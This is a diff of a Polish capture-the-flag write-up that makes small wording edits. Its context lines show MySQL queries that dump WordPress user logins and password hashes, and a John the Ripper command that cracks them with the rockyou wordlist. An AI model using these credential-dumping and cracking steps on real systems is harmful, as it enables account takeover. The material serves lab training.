@@ -434,7 +434,7 @@ show columns from wp_users;
 11 rows in set (0.01 sec)
 ```
 
-Wygląda na to, że mamy kolejną flagę.
+Wygląda na to, że mamy kolejną flagę
 ```
 mysql> select flag2 from wp_users;
 select flag2 from wp_users;
@@ -447,7 +447,7 @@ select flag2 from wp_users;
 2 rows in set (0.00 sec)
 ```
 
-Niestety nie tym razem. W zamian poszukajmy loginów i haseł istniejących użytkowników:
+Niestety nie tym razem :( W zamian za to poszukajmy loginów i haseł istniejących użytkowników:
 `select user_login, user_pass from wp_users;`
 
 W efekcie dostajemy:
@@ -551,7 +551,7 @@ Zapisujemy dane do pliku _mysql_hashes.txt_ i formatujemy tekst do postaci `user
 Wywołujemy **Johna** i korzystamy z gotowej listy słownikowej: \
 `john mysql_hash.txt --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt` \
 
-Wreszcie możemy zobaczyć efekty: \
+Wreszcie widzimy: \
 `john --show mysql_hash.txt`
 
 ```
